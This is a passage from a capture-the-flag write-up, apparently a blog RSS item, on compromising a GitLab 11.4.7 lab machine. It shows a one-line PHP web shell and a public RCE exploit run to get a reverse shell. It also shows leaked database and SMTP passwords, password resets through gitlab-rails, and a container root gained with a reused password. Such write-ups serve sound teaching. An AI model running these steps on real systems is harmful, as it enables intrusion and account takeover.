<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Linux on 5ysk3y Pwnz</title>
    <link>https://5ysk3y.github.io/tags/linux/</link>
    <description>Recent content in Linux on 5ysk3y Pwnz</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 06 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://5ysk3y.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Ready [Medium] - Linux</title>
      <link>https://5ysk3y.github.io/htb/guides/ready/</link>
      <pubDate>Tue, 06 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://5ysk3y.github.io/htb/guides/ready/</guid>
      <description>Ready was a quick an easy box that uses an outdated and vulnerable version of GitLab to allow initial exploitation and shell access to a hosted docker container. From there, root elevation within the container is required so that it&amp;rsquo;s underlying configration can be abused in order to provide root access to the host machine. Let&amp;rsquo;s see how I did all that!</description>
      <content>
  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/ready.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Ready was a quick an easy box that uses an outdated and vulnerable version of GitLab to allow initial exploitation and shell access to a hosted docker container. From there, root elevation within the container is required so that it&amp;rsquo;s underlying configration can be abused in order to provide root access to the host machine. Let&amp;rsquo;s see how I did all that!&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
&lt;p&gt;For reference here&amp;rsquo;s a full (script/version enumeration) outline of the top 1000 ports on the machine:&lt;/p&gt;
&lt;h5 id=&#34;initial-scan&#34;&gt;Initial Scan:&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ready.htb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.10.220&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
Host is up, received conn-refused &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.024s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Scanned at 2021-03-31 16:05:21 BST &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 13s
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
Reason: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; conn-refused
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;3072&lt;/span&gt; 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
5080/tcp open  http    syn-ack nginx
|_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; disallowed entries &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; shown&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
| /s/ /snippets/new /snippets/*/edit /snippets/*/raw
| /*/*.git /*/*/fork/new /*/*/repository/archive* /*/*/activity
| /*/*/new /*/*/edit /*/*/raw /*/*/blame /*/*/commits/*/*
| /*/*/commit/*.patch /*/*/commit/*.diff /*/*/compare /*/*/branches/new
| /*/*/tags/new /*/*/network /*/*/graphs /*/*/milestones/new
| /*/*/milestones/*/edit /*/*/issues/new /*/*/issues/*/edit
| /*/*/merge_requests/new /*/*/merge_requests/*.patch
|_/*/*/merge_requests/*.diff /*/*/merge_requests/*/edit
| http-title: Sign in &lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;C2&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;B7 GitLab
|_Requested resource was http://ready.htb:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap done at Wed Mar 31 16:05:34 2021 -- 1 IP address (1 host up) scanned in 13.73 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As well as a full, but simple, port scan for good measure:&lt;/p&gt;
&lt;h5 id=&#34;full-scan&#34;&gt;Full Scan:&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ready.htb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.10.220&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.022s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65533&lt;/span&gt; closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreen
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;initial-enumeration&#34;&gt;Initial Enumeration&lt;/h1&gt;
&lt;p&gt;Following the NMAP scans shown above, we can see that theres 2 ports:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;22/tcp&lt;/strong&gt; (ssh)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;5080/tcp&lt;/strong&gt; (www)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Initially the most interesting port is 5080&amp;ndash; an unusual port to run NGINX on, but it can be looked at none-the-less.&lt;/p&gt;
&lt;p&gt;Visting the site and we can see that it&amp;rsquo;s actually a Gitlab instance. We can sign up and get access, and establish that there is a repository in existence named &lt;code&gt;ready-channel&lt;/code&gt;:&lt;/p&gt;

  &lt;figure class=&#34;left&#34; &gt;
    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/ready/20210331174542.png&#34;   /&gt;
    
  &lt;/figure&gt;


&lt;p&gt;Looking at the contents, it looks like its an incredibly(!) old version of the &lt;a href=&#34;https://github.com/drupal/drupal&#34; target=&#34;_blank&#34;&gt;Drupal CMS&lt;/a&gt;
 - looking at the included CHANGELOG file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ head CHANGELOG.txt

Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;access bypass&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. See SA-CORE-2017-003.

Drupal 7.55, 2017-06-07
-----------------------
- Fixed incompatibility with PHP versions 7.0.19 and 7.1.5 due to duplicate
  DATE_RFC7231 definition.
- Made Drupal core pass all automated tests on PHP 7.1.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In total, the repository owner has made a total of 4 commits, most of them excessive in terms of the amount of &amp;ldquo;changes&amp;rdquo; made. This makes it difficult to parse through changes, at a glance, for anything sensitive.&lt;/p&gt;
&lt;p&gt;Looking around the filesystem, there are some interesting things if you look closely. First, a set of potential MySQL creds:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$databases &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt; (
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt; (
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt; (
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;database&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;drupal&amp;#39;&lt;/span&gt;,
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;drupaluser&amp;#39;&lt;/span&gt;,
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%%cHzhNC=k9yYN!T&amp;#39;&lt;/span&gt;,
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;host&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;,
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;port&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;driver&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mysql&amp;#39;&lt;/span&gt;,
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;prefix&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
    ),
  ),
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://ready.htb:5080/dude/ready-channel/blob/master/sites/default/settings.php&#34;&gt;http://ready.htb:5080/dude/ready-channel/blob/master/sites/default/settings.php&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;There also appears to be a shell file, showing as 8 months old, located here:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;( $_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;] ) ) { &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;( $_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 2&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt; ); }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://ready.htb:5080/dude/ready-channel/blob/master/sites/default/files/shell.php&#34;&gt;http://ready.htb:5080/dude/ready-channel/blob/master/sites/default/files/shell.php&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Some time was spent trying to find a defined &lt;code&gt;base_url&lt;/code&gt; but I wasn&amp;rsquo;t able to find one outside of default definitions. From there, a version number was enumerated via the sites &lt;code&gt;/help&lt;/code&gt; page - this is also available as a link in the top right hand corner of the page:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GitLab Community Edition 11.4.7&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Looking at exploitDB there is indeed a CVE for this version:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ searchsploit gitlab 11.4.7
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GitLab 11.4.7 - RCE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Authenticated&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                                                                  | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Authenticated&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                                                                                                                                                | ruby/webapps/49257.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Grabbing one of these and running it verbatim gives us a shell as the git user (albeit in a Docker container):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ python3 49334.py -u syskey -p password -g http://ready.htb -l 10.10.14.8 -P &lt;span style=&#34;color:#ae81ff&#34;&gt;9001&lt;/span&gt;                             &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ⨯
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; authenticity_token: VHwOXloRm01plhWdGqA9+DOR2WBpGR+fxfgVtKGvgY6l/GQ+zce4ijRD5ISpJ55L5rE14SQk3WezNZ5jK3hqPg&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Creating project with random name: project266
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Running Exploit
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Exploit completed successfully!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
&lt;p&gt;Once on the box, a quick poke a round was in order but, honestly, familiarity with Gitlab setups (let alone a docker variant) is limited in my own experience so the easiest thing to start with was an enumeration script like LinPEAS.&lt;/p&gt;
&lt;p&gt;As it so happens, one of the features for LinPEAS is to enumerate Gitlab files to dump useful information, such as:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{&amp;quot;id&amp;quot;=&amp;gt;2,&amp;quot;email&amp;quot;=&amp;gt;&amp;quot;dude@ready.com&amp;quot;,&amp;quot;encrypted_password&amp;quot;=&amp;gt;&amp;quot;$2a$10$NOMTXhO31vqykicMa6zj3O.F5PIyI9q/S4c.v22eMSfXNDdtpI2Mm&amp;quot;}

&amp;quot;id&amp;quot;=&amp;gt;3,&amp;quot;email&amp;quot;=&amp;gt;&amp;quot;mitroglou@ready.com&amp;quot;,&amp;quot;encrypted_password&amp;quot;=&amp;gt;&amp;quot;$2a$10$4vZAglOnEdNEe1SoNj1IE.RfotOt9gPnOXBEihjd7QBhsUmgmAdLi&amp;quot;}

{&amp;quot;id&amp;quot;=&amp;gt;1,&amp;quot;email&amp;quot;=&amp;gt;&amp;quot;admin@example.com&amp;quot;,&amp;quot;encrypted_password&amp;quot;=&amp;gt;&amp;quot;$2a$10$.Kc4bwq3BqLCEzAGJVIJFeK4emNnucvAqk1vCv4Yp45yy2nmrFa.2&amp;quot;}

{&amp;quot;id&amp;quot;=&amp;gt;4, &amp;quot;email&amp;quot;=&amp;gt;&amp;quot;test@test.gr&amp;quot;,&amp;quot;encrypted_password&amp;quot;=&amp;gt;&amp;quot;$2a$10$7xK1UPcwvjWIo4ioCz28GeFSt.NR00AHsY2AF.gWzaWwikRVXCTXa&amp;quot;}

gitlab_rails[&#39;smtp_password&#39;] = &amp;quot;wW59U!ZKMbG9+*#h&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As expected, attempting to crack the hashes doesn&amp;rsquo;t yield any results - at least not in a quick amount of time, namely as they&amp;rsquo;re bcrypt hashes. That said, running as the git user has its benefits because passwords can be reset rather easily if needed:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;gitlab&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rails runner &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user = User.find_by(email: &amp;#34;dude@ready.com&amp;#34;); user.password = &amp;#34;ReallySecurePassword123!&amp;#34;; user.password_confirmation = &amp;#34;ReallySecurePassword123!&amp;#34;; user.save!&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After resetting passwords for dude, admin and mitroglou with Gitlab and logging in, there&amp;rsquo;s no additional useful information hidden. A few potential passwords have been garnered though; the SMTP password LinPeas grabbed, above, as well as the MySQL credentials we gathered earlier from poking around GitLab manually.&lt;/p&gt;
&lt;p&gt;In this case, a quick manual password spray was in order - initially against the &lt;code&gt;dude&lt;/code&gt; user - the win was much better than that though as using &lt;code&gt;su&lt;/code&gt; with the &lt;code&gt;smtp_password&lt;/code&gt; value gets us root on the container:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git@gitlab:~$ su
Password:
root@gitlab:/var/opt/gitlab#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we have root, so lets try and breakout this contianer.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
&lt;p&gt;Once on as the root user, it&amp;rsquo;s generally favorable to run another enumeration scanner, like LinPEAS, to try and aggregate anything you may miss.&lt;/p&gt;
&lt;p&gt;In this case it highlights an uncommon folder, although this isn&amp;rsquo;t all too difficult to find manually, either.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/opt/backup&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@gitlab:/opt/backup# ls -la
total 112
drwxr-xr-x 2 root root  4096 Dec  7 09:25 .
drwxr-xr-x 1 root root  4096 Dec  1 16:23 ..
-rw-r--r-- 1 root root   872 Dec  7 09:25 docker-compose.yml
-rw-r--r-- 1 root root 15092 Dec  1 16:23 gitlab-secrets.json
-rw-r--r-- 1 root root 79639 Dec  1 19:20 gitlab.rb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Inside here there is a &lt;code&gt;docker-compose.yml&lt;/code&gt; file&amp;ndash; presumably the one used to create the container we&amp;rsquo;re in, based on the contents:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;version&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2.4&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;services&lt;/span&gt;:
  &lt;span style=&#34;color:#f92672&#34;&gt;web&lt;/span&gt;:
    &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gitlab/gitlab-ce:11.4.7-ce.0&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;restart&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;always&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;hostname&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gitlab.example.com&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;environment&lt;/span&gt;:
      &lt;span style=&#34;color:#f92672&#34;&gt;GITLAB_OMNIBUS_CONFIG&lt;/span&gt;: |&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        external_url &amp;#39;http://172.19.0.2&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        redis[&amp;#39;bind&amp;#39;]=&amp;#39;127.0.0.1&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        redis[&amp;#39;port&amp;#39;]=6379
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        gitlab_rails[&amp;#39;initial_root_password&amp;#39;]=File.read(&amp;#39;/root_pass&amp;#39;)&lt;/span&gt;        
    &lt;span style=&#34;color:#f92672&#34;&gt;networks&lt;/span&gt;:
      &lt;span style=&#34;color:#f92672&#34;&gt;gitlab&lt;/span&gt;:
        &lt;span style=&#34;color:#f92672&#34;&gt;ipv4_address&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;172.19.0.2&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;ports&lt;/span&gt;:
      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;5080:80&amp;#39;&lt;/span&gt;
      &lt;span style=&#34;color:#75715e&#34;&gt;#- &amp;#39;127.0.0.1:5080:80&amp;#39;&lt;/span&gt;
      &lt;span style=&#34;color:#75715e&#34;&gt;#- &amp;#39;127.0.0.1:50443:443&amp;#39;&lt;/span&gt;
      &lt;span style=&#34;color:#75715e&#34;&gt;#- &amp;#39;127.0.0.1:5022:22&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;volumes&lt;/span&gt;:
      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./srv/gitlab/config:/etc/gitlab&amp;#39;&lt;/span&gt;
      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./srv/gitlab/logs:/var/log/gitlab&amp;#39;&lt;/span&gt;
      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./srv/gitlab/data:/var/opt/gitlab&amp;#39;&lt;/span&gt;
      - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./root_pass:/root_pass&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;privileged&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;restart&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;unless-stopped&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;#mem_limit: 1024m&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;networks&lt;/span&gt;:
  &lt;span style=&#34;color:#f92672&#34;&gt;gitlab&lt;/span&gt;:
    &lt;span style=&#34;color:#f92672&#34;&gt;driver&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;bridge&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;ipam&lt;/span&gt;:
      &lt;span style=&#34;color:#f92672&#34;&gt;config&lt;/span&gt;:
        - &lt;span style=&#34;color:#f92672&#34;&gt;subnet&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;172.19.0.0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;/16&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This also shows one very interesting, and &lt;em&gt;very&lt;/em&gt; vulnerable, thing:&lt;/p&gt;
